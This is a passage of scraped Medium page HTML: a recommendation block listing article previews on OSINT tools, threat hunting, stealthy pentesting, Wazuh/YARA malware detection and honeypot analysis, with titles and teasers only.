Medium</h2><div class="qx qy qz ra rb m"><div class="abp ac mg kx abq abr abs abt abu abv abw abx aby abz aca acb acc acd ace"><div class="acf acg ach wx aci acj ack ww acl acm acn aco acp acq acr acs act acu acv acw acx"><div class="acy acz ada adb adc ed m"><article class="ed" data-testid="post-preview"><div class="ed vt m"><div class="bi ed"><div class="ed m"><div class="fr ed add ade adf adg adh adi adj adk adl adm adn ado adp" role="link" data-href="https://hartarto.medium.com/15-free-osint-tools-that-reveal-everything-online-2026-guide-8d74162d70ec" tabindex="0"><div class="adq"><div aria-label="15 Free OSINT Tools That Reveal Everything Online (2026 Guide)"></div></div><div class="adr ac ci cv"><div class="ac cv zd bi adz aea aeb aec"><div class="aed aee aef aeg aeh ac r"><div class="vl m"><div class="m"><div><div class="m" aria-describedby="116" aria-labelledby="116" role="tooltip"><div tabindex="-1" class="bf"><a tabindex="-1" href="https://hartarto.medium.com/?source=post_page---read_next_recirc--a4206e8a4bc8----0---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------" rel="noopener follow"><div class="m fr"><img alt="Hartarto" class="m fk by aei aej de" width="20" height="20" loading="lazy" src="https://miro.medium.com/v2/resize:fill:20:20/1*6oQdch9vjyYS58bBmtyaZQ.jpeg"><div class="gj by m aei aej fw o ak gk"></div></div></a></div></div></div></div></div><div><div class="m" aria-describedby="117" aria-labelledby="117" role="tooltip"><div tabindex="-1" class="bf"><a class="ah ai aj fo al am an ao ap aq ar as at kv ac r" href="https://hartarto.medium.com/?source=post_page---read_next_recirc--a4206e8a4bc8----0---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------" rel="noopener follow"><p class="bg b ec ab ga aek gm ael aem aen aeo aep bl">Hartarto</p></a></div></div></div></div><div class="aer m aes aet aeu aev aew ib"><div class="aex aey aez afa afb afc afd afe"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://hartarto.medium.com/15-free-osint-tools-that-reveal-everything-online-2026-guide-8d74162d70ec?source=post_page---read_next_recirc--a4206e8a4bc8----0---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------" rel="noopener follow"><div title=""><h2 class="bg jb pt pv aff afg afh afi afj afk gy pw py afl afm afn afo afp afq ha hb hc afr afs aft afu afv afw hd he hf afx afy afz aga agb agc hg hh hi agd age agf agg agh agi hj aep bl">15 Free OSINT Tools That Reveal Everything Online (2026 Guide)</h2></div><div class="agj m"><h3 class="bg b hm ab ga agk gm ael agl aen aep eb">Everything about you online leaves a trail. Emails, websites, servers, and devices continuously expose information — not because you were…</h3></div></a></div></div><span class="bg b ec ab eb"><div class="wp ac cw ag"><div class="ac r ago"><div class="vt ac"><button class="m ak aq ao" aria-label="Member-only story"><div class=""><div><div class="bn" aria-describedby="118" aria-labelledby="118" role="tooltip"><div tabindex="-1" class="bf"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" viewBox="0 0 64 64"><path fill="#FFC017" d="m39.637 40.831-5.771 15.871a1.99 1.99 0 0 1-3.732 0l-5.771-15.87a2.02 2.02 0 0 0-1.194-1.195L7.298 33.866a1.99 1.99 0 0 1 0-3.732l15.87-5.771a2.02 2.02 0 0 0 1.195-1.194l5.771-15.871a1.99 1.99 0 0 1 3.732 0l5.771 15.87a2.02 2.02 0 0 0 1.194 1.195l15.871 5.771a1.99 1.99 0 0 1 0 3.732l-15.87 5.771a2.02 2.02 0 0 0-1.195 1.194"></path></svg></div></div></div></div></button></div><span>Jan 7</span><div class=""><div class="fr agm do ac r"><div class="fw ht agn ac r ago"><div class="fn do agp m de"></div></div><a class="fw nc agn ac r ago" tabindex="-1" href="https://hartarto.medium.com/15-free-osint-tools-that-reveal-everything-online-2026-guide-8d74162d70ec?source=post_page---read_next_recirc--a4206e8a4bc8----0---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------" rel="noopener follow"><div><div class="ac" aria-describedby="253" aria-labelledby="253" role="tooltip"><div tabindex="-1" class="bf"><div class="ac r agq"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" aria-labelledby="clap-filled-static-desc" viewBox="0 0 16 16"><desc id="clap-filled-static-desc">A clap icon</desc><path fill="#6B6B6B" fill-rule="evenodd" d="m3.672 10.167 2.138 2.14h-.002c1.726 1.722 4.337 2.436 5.96.81 1.472-1.45 1.806-3.68.76-5.388l-1.815-3.484c-.353-.524-.849-1.22-1.337-.958-.49.261 0 1.56 0 1.56l.78 1.932L6.43 2.866c-.837-.958-1.467-1.108-1.928-.647-.33.33-.266.856.477 1.598.501.503 1.888 1.957 1.888 1.957.17.174.083.485-.093.655a.56.56 0 0 1-.34.163.43.43 0 0 1-.317-.135s-2.4-2.469-2.803-2.87c-.344-.346-.803-.54-1.194-.15-.408.406-.273 1.065.11 1.447.345.346 2.31 2.297 2.685 2.67l.062.06c.17.175.269.628.093.8-.193.188-.453.33-.678.273a.9.9 0 0 1-.446-.273S2.501 6.84 1.892 6.23c-.407-.406-.899-.333-1.229 0-.525.524.263 1.28 1.73 2.691.384.368.814.781 1.279 1.246m8.472-7.219c.372-.29.95-.28 1.303.244V3.19l1.563 3.006.036.074c.885 1.87.346 4.093-.512 5.159l-.035.044c-.211.264-.344.43-.74.61 1.382-1.855.963-3.478-.248-5.456L11.943 3.88l-.002-.037c-.017-.3-.039-.71.203-.895" clip-rule="evenodd"></path></svg><span>905</span></div></div></div></div><div><div class="ac" aria-describedby="119" aria-labelledby="119" role="tooltip"><div tabindex="-1" class="bf"><div class="ac r agq"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#6B6B6B" aria-labelledby="response-filled-16px-desc" viewBox="0 0 16 16"><desc id="response-filled-16px-desc">A response icon</desc><path fill="#6B6B6B" d="M12.344 11.458A5.28 5.28 0 0 0 14 7.526C14 4.483 11.391 2 8.051 2S2 4.483 2 7.527c0 3.051 2.712 5.526 6.059 5.526a6.6 6.6 0 0 0 1.758-.236q.255.223.554.414c.784.51 1.626.768 2.512.768a.37.37 0 0 0 .355-.214.37.37 0 0 0-.03-.384 4.7 4.7 0 0 1-.857-1.958v.014z"></path></svg><span>11</span></div></div></div></div></a></div></div></div><div class="ac r ags agt"><div class="agr"></div><div class=""><div><div class="bn" aria-describedby="120" aria-labelledby="120" role="tooltip"><div tabindex="-1" class="bf"><span data-dd-action-name="Susi presentation tracker bookmark_preview"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2F8d74162d70ec&amp;operation=register&amp;redirect=https%3A%2F%2Fhartarto.medium.com%2F15-free-osint-tools-that-reveal-everything-online-2026-guide-8d74162d70ec&amp;source=---read_next_recirc--a4206e8a4bc8----0-----------------bookmark_preview----75793c19_33d1_4bfc_9a40_89e356a0093a--------------" rel="noopener follow"><span class="agr"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="eb ni" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></span></a></span></div></div></div></div></div></div></span><div class="k j e"><div class="xh bi xv ng"></div></div></div></div></div></div></div></div></article></div></div><div class="acf acg ach wx aci acj ack ww acl acm acn aco acp acq acr acs act acu acv acw acx"><div class="acy acz ada adb adc ed m"><article class="ed" data-testid="post-preview"><div class="ed vt m"><div class="bi ed"><div class="ed m"><div class="fr ed add ade adf adg adh adi adj adk adl adm adn ado adp" role="link" data-href="https://medium.com/capturedsignal/notepad-security-incident-threat-hunting-using-kql-and-defender-for-endpoint-logs-dd83b984fcc6" tabindex="0"><div class="adq"><div aria-label="Notepad++ Security Incident — Threat Hunting using KQL and Defender for Endpoint logs"></div></div><div class="adr ac ci cv"><div class="ac cv zd bi adz aea aeb aec"><div class="aed aee aef aeg aeh ac r"><div class="vl m"><div><div class="m" aria-describedby="121" aria-labelledby="121" role="tooltip"><div tabindex="-1" class="bf"><a href="https://medium.com/capturedsignal?source=post_page---read_next_recirc--a4206e8a4bc8----1---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------" rel="noopener follow"><div class="fr"><img alt="CapturedSignal" class="de hw m aej aei" width="20" height="20" loading="lazy" src="https://miro.medium.com/v2/resize:fill:20:20/1*6BhwCO8OOhRJKPgYe28jBg.png"><div class="hw m aei aej fw o gj gk"></div></div></a></div></div></div></div><div class="wy m gc"><p class="bg b ec ab eb">In</p></div><div class="m"><div><div class="m" aria-describedby="122" aria-labelledby="122" role="tooltip"><div tabindex="-1" class="bf"><a class="ah ai aj fo al am an ao ap aq ar as at kv ac r" href="https://medium.com/capturedsignal?source=post_page---read_next_recirc--a4206e8a4bc8----1---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------" rel="noopener follow"><p class="bg b ec ab ga aek gm ael aem aen aeo aep bl">CapturedSignal</p></a></div></div></div></div><div class="aeq m"><p class="bg b ec ab eb">by</p></div><div><div class="m" aria-describedby="123" aria-labelledby="123" role="tooltip"><div tabindex="-1" class="bf"><a class="ah ai aj fo al am an ao ap aq ar as at kv ac r" href="https://medium.com/@turekbar?source=post_page---read_next_recirc--a4206e8a4bc8----1---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------" rel="noopener follow"><p class="bg b ec ab ga aek gm ael aem aen aeo aep bl">Bartosz Turek</p></a></div></div></div></div><div class="aer m aes aet aeu aev aew ib"><div class="aex aey aez afa afb afc afd afe"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://medium.com/capturedsignal/notepad-security-incident-threat-hunting-using-kql-and-defender-for-endpoint-logs-dd83b984fcc6?source=post_page---read_next_recirc--a4206e8a4bc8----1---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------" rel="noopener follow"><div title="Notepad++ Security Incident — Threat Hunting using KQL and Defender for Endpoint logs"><h2 class="bg jb pt pv aff afg afh afi afj afk gy pw py afl afm afn afo afp afq ha hb hc afr afs aft afu afv afw hd he hf afx afy afz aga agb agc hg hh hi agd age agf agg agh agi hj aep bl">Notepad++ Security Incident — Threat Hunting using KQL and Defender for Endpoint logs</h2></div><div class="agj m"><h3 class="bg b hm ab ga agk gm ael agl aen aep eb">First of all, bad news, I don’t think you have 8 months of hot retention logs in your Sentinel. The incident took place from June 2025 to…</h3></div></a></div></div><span class="bg b ec ab eb"><div class="wp ac cw ag"><div class="ac r ago"><span>Feb 2</span><div class=""><div class="fr agm do ac r"><div class="fw ht agn ac r ago"><div class="fn do agp m de"></div></div><a class="fw nc agn ac r ago" tabindex="-1" href="https://medium.com/capturedsignal/notepad-security-incident-threat-hunting-using-kql-and-defender-for-endpoint-logs-dd83b984fcc6?source=post_page---read_next_recirc--a4206e8a4bc8----1---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------" rel="noopener follow"><div><div class="ac" aria-describedby="255" aria-labelledby="255" role="tooltip"><div tabindex="-1" class="bf"><div class="ac r agq"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" aria-labelledby="clap-filled-static-desc" viewBox="0 0 16 16"><desc id="clap-filled-static-desc">A clap icon</desc><path fill="#6B6B6B" fill-rule="evenodd" d="m3.672 10.167 2.138 2.14h-.002c1.726 1.722 4.337 2.436 5.96.81 1.472-1.45 1.806-3.68.76-5.388l-1.815-3.484c-.353-.524-.849-1.22-1.337-.958-.49.261 0 1.56 0 1.56l.78 1.932L6.43 2.866c-.837-.958-1.467-1.108-1.928-.647-.33.33-.266.856.477 1.598.501.503 1.888 1.957 1.888 1.957.17.174.083.485-.093.655a.56.56 0 0 1-.34.163.43.43 0 0 1-.317-.135s-2.4-2.469-2.803-2.87c-.344-.346-.803-.54-1.194-.15-.408.406-.273 1.065.11 1.447.345.346 2.31 2.297 2.685 2.67l.062.06c.17.175.269.628.093.8-.193.188-.453.33-.678.273a.9.9 0 0 1-.446-.273S2.501 6.84 1.892 6.23c-.407-.406-.899-.333-1.229 0-.525.524.263 1.28 1.73 2.691.384.368.814.781 1.279 1.246m8.472-7.219c.372-.29.95-.28 1.303.244V3.19l1.563 3.006.036.074c.885 1.87.346 4.093-.512 5.159l-.035.044c-.211.264-.344.43-.74.61 1.382-1.855.963-3.478-.248-5.456L11.943 3.88l-.002-.037c-.017-.3-.039-.71.203-.895" clip-rule="evenodd"></path></svg><span>26</span></div></div></div></div></a></div></div></div><div class="ac r ags agt"><div class="agr"></div><div class=""><div><div class="bn" aria-describedby="124" aria-labelledby="124" role="tooltip"><div tabindex="-1" class="bf"><span data-dd-action-name="Susi presentation tracker bookmark_preview"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2Fdd83b984fcc6&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2Fcapturedsignal%2Fnotepad-security-incident-threat-hunting-using-kql-and-defender-for-endpoint-logs-dd83b984fcc6&amp;source=---read_next_recirc--a4206e8a4bc8----1-----------------bookmark_preview----75793c19_33d1_4bfc_9a40_89e356a0093a--------------" rel="noopener follow"><span class="agr"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="eb ni" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></span></a></span></div></div></div></div></div></div></span></div></div></div></div></div></div></article></div></div></div></div><div class="abp ac mg kx abq abr abs abt abu abv abw abx aby abz aca acb acc acd ace"><div class="acf acg ach wx aci acj ack ww acl acm acn aco acp acq acr acs act acu acv acw acx"><div class="acy acz ada adb adc ed m"><article class="ed" data-testid="post-preview"><div class="ed vt m"><div class="bi ed"><div class="ed m"><div class="fr ed add ade adf adg adh adi adj adk adl adm adn ado adp" role="link" data-href="https://medium.verylazytech.com/13-techniques-to-stay-undetected-in-corporate-networks-master-stealthy-pentesting-like-a-pro-4a70120a9062" tabindex="0"><div class="adq"><div aria-label="13 Techniques to Stay Undetected in Corporate Networks: Master Stealthy Pentesting Like a Pro"></div></div><div class="adr ac ci cv"><div class="ac cv zd bi adz aea aeb aec"><div class="aed aee aef aeg aeh ac r"><div class="vl m"><div class="m"><div><div class="m" aria-describedby="125" aria-labelledby="125" role="tooltip"><div tabindex="-1" class="bf"><a tabindex="-1" href="https://medium.verylazytech.com/?source=post_page---read_next_recirc--a4206e8a4bc8----0---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------" rel="noopener follow"><div class="m fr"><img alt="Very Lazy Tech 👾" class="m fk by aei aej de" width="20" height="20" loading="lazy" src="https://miro.medium.com/v2/resize:fill:20:20/1*cQVMEaLp7npt5Gw9hUV7aQ.png"><div class="gj by m aei aej fw o ak gk"></div></div></a></div></div></div></div></div><div><div class="m" aria-describedby="126" aria-labelledby="126" role="tooltip"><div tabindex="-1" class="bf"><a class="ah ai aj fo al am an ao ap aq ar as at kv ac r" href="https://medium.verylazytech.com/?source=post_page---read_next_recirc--a4206e8a4bc8----0---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------" rel="noopener follow"><p class="bg b ec ab ga aek gm ael aem aen aeo aep bl">Very Lazy Tech 👾</p></a></div></div></div></div><div class="aer m aes aet aeu aev aew ib"><div class="aex aey aez afa afb afc afd afe"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://medium.verylazytech.com/13-techniques-to-stay-undetected-in-corporate-networks-master-stealthy-pentesting-like-a-pro-4a70120a9062?source=post_page---read_next_recirc--a4206e8a4bc8----0---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------" rel="noopener follow"><div title="13 Techniques to Stay Undetected in Corporate Networks: Master Stealthy Pentesting Like a Pro"><h2 class="bg jb pt pv aff afg afh afi afj afk gy pw py afl afm afn afo afp afq ha hb hc afr afs aft afu afv afw hd he hf afx afy afz aga agb agc hg hh hi agd age agf agg agh agi hj aep bl">13 Techniques to Stay Undetected in Corporate Networks: Master Stealthy Pentesting Like a Pro</h2></div><div class="agj m"><h3 class="bg b hm ab ga agk gm ael agl aen aep eb">Why Stealth Matters in Modern Pentesting</h3></div></a></div></div><span class="bg b ec ab eb"><div class="wp ac cw ag"><div class="ac r ago"><div class="vt ac"><button class="m ak aq ao" aria-label="Member-only story"><div class=""><div><div class="bn" aria-describedby="127" aria-labelledby="127" role="tooltip"><div tabindex="-1" class="bf"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" viewBox="0 0 64 64"><path fill="#FFC017" d="m39.637 40.831-5.771 15.871a1.99 1.99 0 0 1-3.732 0l-5.771-15.87a2.02 2.02 0 0 0-1.194-1.195L7.298 33.866a1.99 1.99 0 0 1 0-3.732l15.87-5.771a2.02 2.02 0 0 0 1.195-1.194l5.771-15.871a1.99 1.99 0 0 1 3.732 0l5.771 15.87a2.02 2.02 0 0 0 1.194 1.195l15.871 5.771a1.99 1.99 0 0 1 0 3.732l-15.87 5.771a2.02 2.02 0 0 0-1.195 1.194"></path></svg></div></div></div></div></button></div><span>Feb 1</span><div class=""><div class="fr agm do ac r"><div class="fw ht agn ac r ago"><div class="fn do agp m de"></div></div><a class="fw nc agn ac r ago" tabindex="-1" href="https://medium.verylazytech.com/13-techniques-to-stay-undetected-in-corporate-networks-master-stealthy-pentesting-like-a-pro-4a70120a9062?source=post_page---read_next_recirc--a4206e8a4bc8----0---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------" rel="noopener follow"><div><div class="ac" aria-describedby="256" aria-labelledby="256" role="tooltip"><div tabindex="-1" class="bf"><div class="ac r agq"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" aria-labelledby="clap-filled-static-desc" viewBox="0 0 16 16"><desc id="clap-filled-static-desc">A clap icon</desc><path fill="#6B6B6B" fill-rule="evenodd" d="m3.672 10.167 2.138 2.14h-.002c1.726 1.722 4.337 2.436 5.96.81 1.472-1.45 1.806-3.68.76-5.388l-1.815-3.484c-.353-.524-.849-1.22-1.337-.958-.49.261 0 1.56 0 1.56l.78 1.932L6.43 2.866c-.837-.958-1.467-1.108-1.928-.647-.33.33-.266.856.477 1.598.501.503 1.888 1.957 1.888 1.957.17.174.083.485-.093.655a.56.56 0 0 1-.34.163.43.43 0 0 1-.317-.135s-2.4-2.469-2.803-2.87c-.344-.346-.803-.54-1.194-.15-.408.406-.273 1.065.11 1.447.345.346 2.31 2.297 2.685 2.67l.062.06c.17.175.269.628.093.8-.193.188-.453.33-.678.273a.9.9 0 0 1-.446-.273S2.501 6.84 1.892 6.23c-.407-.406-.899-.333-1.229 0-.525.524.263 1.28 1.73 2.691.384.368.814.781 1.279 1.246m8.472-7.219c.372-.29.95-.28 1.303.244V3.19l1.563 3.006.036.074c.885 1.87.346 4.093-.512 5.159l-.035.044c-.211.264-.344.43-.74.61 1.382-1.855.963-3.478-.248-5.456L11.943 3.88l-.002-.037c-.017-.3-.039-.71.203-.895" clip-rule="evenodd"></path></svg><span>109</span></div></div></div></div></a></div></div></div><div class="ac r ags agt"><div class="agr"></div><div class=""><div><div class="bn" aria-describedby="128" aria-labelledby="128" role="tooltip"><div tabindex="-1" class="bf"><span data-dd-action-name="Susi presentation tracker bookmark_preview"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2F4a70120a9062&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.verylazytech.com%2F13-techniques-to-stay-undetected-in-corporate-networks-master-stealthy-pentesting-like-a-pro-4a70120a9062&amp;source=---read_next_recirc--a4206e8a4bc8----0-----------------bookmark_preview----75793c19_33d1_4bfc_9a40_89e356a0093a--------------" rel="noopener follow"><span class="agr"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="eb ni" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></span></a></span></div></div></div></div></div></div></span><div class="k j e"><div class="xh bi xv ng"></div></div></div></div></div></div></div></div></article></div></div><div class="acf acg ach wx aci acj ack ww acl acm acn aco acp acq acr acs act acu acv acw acx"><div class="acy acz ada adb adc ed m"><article class="ed" data-testid="post-preview"><div class="ed vt m"><div class="bi ed"><div class="ed m"><div class="fr ed add ade adf adg adh adi adj adk adl adm adn ado adp" role="link" data-href="https://medium.com/@syedjawad07/detecting-malware-in-real-time-integrating-wazuh-fim-with-yara-d397edcd3b9a" tabindex="0"><div class="adq"><div aria-label="Detecting Malware in Real-Time: Integrating Wazuh FIM with YARA"></div></div><div class="adr ac ci cv"><div class="ac cv zd bi adz aea aeb aec"><div class="aed aee aef aeg aeh ac r"><div class="vl m"><div class="m"><div><div class="m" aria-describedby="129" aria-labelledby="129" role="tooltip"><div tabindex="-1" class="bf"><a tabindex="-1" href="https://medium.com/@syedjawad07?source=post_page---read_next_recirc--a4206e8a4bc8----1---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------" rel="noopener follow"><div class="m fr"><img alt="Syed Jawad" class="m fk by aei aej de" width="20" height="20" loading="lazy" src="https://miro.medium.com/v2/resize:fill:20:20/1*h6aMT8eBVJU1VIKYXW1Ncw.png"><div class="gj by m aei aej fw o ak gk"></div></div></a></div></div></div></div></div><div><div class="m" aria-describedby="130" aria-labelledby="130" role="tooltip"><div tabindex="-1" class="bf"><a class="ah ai aj fo al am an ao ap aq ar as at kv ac r" href="https://medium.com/@syedjawad07?source=post_page---read_next_recirc--a4206e8a4bc8----1---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------" rel="noopener follow"><p class="bg b ec ab ga aek gm ael aem aen aeo aep bl">Syed Jawad</p></a></div></div></div></div><div class="aer m aes aet aeu aev aew ib"><div class="aex aey aez afa afb afc afd afe"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://medium.com/@syedjawad07/detecting-malware-in-real-time-integrating-wazuh-fim-with-yara-d397edcd3b9a?source=post_page---read_next_recirc--a4206e8a4bc8----1---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------" rel="noopener follow"><div title=""><h2 class="bg jb pt pv aff afg afh afi afj afk gy pw py afl afm afn afo afp afq ha hb hc afr afs aft afu afv afw hd he hf afx afy afz aga agb agc hg hh hi agd age agf agg agh agi hj aep bl">Detecting Malware in Real-Time: Integrating Wazuh FIM with YARA</h2></div><div class="agj m"><h3 class="bg b hm ab ga agk gm ael agl aen aep eb">How I Built an Automated Malware Detection System Using Open-Source Tools (Wazuh)</h3></div></a></div></div><span class="bg b ec ab eb"><div class="wp ac cw ag"><div class="ac r ago"><div class="vt ac"><button class="m ak aq ao" aria-label="Member-only story"><div class=""><div><div class="bn" aria-describedby="131" aria-labelledby="131" role="tooltip"><div tabindex="-1" class="bf"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" viewBox="0 0 64 64"><path fill="#FFC017" d="m39.637 40.831-5.771 15.871a1.99 1.99 0 0 1-3.732 0l-5.771-15.87a2.02 2.02 0 0 0-1.194-1.195L7.298 33.866a1.99 1.99 0 0 1 0-3.732l15.87-5.771a2.02 2.02 0 0 0 1.195-1.194l5.771-15.871a1.99 1.99 0 0 1 3.732 0l5.771 15.87a2.02 2.02 0 0 0 1.194 1.195l15.871 5.771a1.99 1.99 0 0 1 0 3.732l-15.87 5.771a2.02 2.02 0 0 0-1.195 1.194"></path></svg></div></div></div></div></button></div><span>Dec 22, 2025</span><div class=""><div class="fr agm do ac r"><div class="fw ht agn ac r ago"><div class="fn do agp m de"></div></div><a class="fw nc agn ac r ago" tabindex="-1" href="https://medium.com/@syedjawad07/detecting-malware-in-real-time-integrating-wazuh-fim-with-yara-d397edcd3b9a?source=post_page---read_next_recirc--a4206e8a4bc8----1---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------" rel="noopener follow"><div><div class="ac" aria-describedby="257" aria-labelledby="257" role="tooltip"><div tabindex="-1" class="bf"><div class="ac r agq"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" aria-labelledby="clap-filled-static-desc" viewBox="0 0 16 16"><desc id="clap-filled-static-desc">A clap icon</desc><path fill="#6B6B6B" fill-rule="evenodd" d="m3.672 10.167 2.138 2.14h-.002c1.726 1.722 4.337 2.436 5.96.81 1.472-1.45 1.806-3.68.76-5.388l-1.815-3.484c-.353-.524-.849-1.22-1.337-.958-.49.261 0 1.56 0 1.56l.78 1.932L6.43 2.866c-.837-.958-1.467-1.108-1.928-.647-.33.33-.266.856.477 1.598.501.503 1.888 1.957 1.888 1.957.17.174.083.485-.093.655a.56.56 0 0 1-.34.163.43.43 0 0 1-.317-.135s-2.4-2.469-2.803-2.87c-.344-.346-.803-.54-1.194-.15-.408.406-.273 1.065.11 1.447.345.346 2.31 2.297 2.685 2.67l.062.06c.17.175.269.628.093.8-.193.188-.453.33-.678.273a.9.9 0 0 1-.446-.273S2.501 6.84 1.892 6.23c-.407-.406-.899-.333-1.229 0-.525.524.263 1.28 1.73 2.691.384.368.814.781 1.279 1.246m8.472-7.219c.372-.29.95-.28 1.303.244V3.19l1.563 3.006.036.074c.885 1.87.346 4.093-.512 5.159l-.035.044c-.211.264-.344.43-.74.61 1.382-1.855.963-3.478-.248-5.456L11.943 3.88l-.002-.037c-.017-.3-.039-.71.203-.895" clip-rule="evenodd"></path></svg><span>5</span></div></div></div></div><div><div class="ac" aria-describedby="132" aria-labelledby="132" role="tooltip"><div tabindex="-1" class="bf"><div class="ac r agq"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#6B6B6B" aria-labelledby="response-filled-16px-desc" viewBox="0 0 16 16"><desc id="response-filled-16px-desc">A response icon</desc><path fill="#6B6B6B" d="M12.344 11.458A5.28 5.28 0 0 0 14 7.526C14 4.483 11.391 2 8.051 2S2 4.483 2 7.527c0 3.051 2.712 5.526 6.059 5.526a6.6 6.6 0 0 0 1.758-.236q.255.223.554.414c.784.51 1.626.768 2.512.768a.37.37 0 0 0 .355-.214.37.37 0 0 0-.03-.384 4.7 4.7 0 0 1-.857-1.958v.014z"></path></svg><span>1</span></div></div></div></div></a></div></div></div><div class="ac r ags agt"><div class="agr"></div><div class=""><div><div class="bn" aria-describedby="133" aria-labelledby="133" role="tooltip"><div tabindex="-1" class="bf"><span data-dd-action-name="Susi presentation tracker bookmark_preview"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2Fd397edcd3b9a&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40syedjawad07%2Fdetecting-malware-in-real-time-integrating-wazuh-fim-with-yara-d397edcd3b9a&amp;source=---read_next_recirc--a4206e8a4bc8----1-----------------bookmark_preview----75793c19_33d1_4bfc_9a40_89e356a0093a--------------" rel="noopener follow"><span class="agr"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="eb ni" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></span></a></span></div></div></div></div></div></div></span><div class="k j e"><div class="xh bi xv ng"></div></div></div></div></div></div></div></div></article></div></div><div class="acf acg ach wx aci acj ack ww acl acm acn aco acp acq acr acs act acu acv acw acx"><div class="acy acz ada adb adc ed m"><article class="ed" data-testid="post-preview"><div class="ed vt m"><div class="bi ed"><div class="ed m"><div class="fr ed add ade adf adg adh adi adj adk adl adm adn ado adp" role="link" data-href="https://allenace.medium.com/introduction-to-honeypot-data-analysis-f25aa5d998de" tabindex="0"><div class="adq"><div aria-label="Introduction to Honeypot Data Analysis"></div></div><div class="adr ac ci cv"><div class="ac cv zd bi adz aea aeb aec"><div class="aed aee aef aeg aeh ac r"><div class="vl m"><div class="m"><div><div class="m" aria-describedby="134" aria-labelledby="134" role="tooltip"><div tabindex="-1" class="bf"><a tabindex="-1" 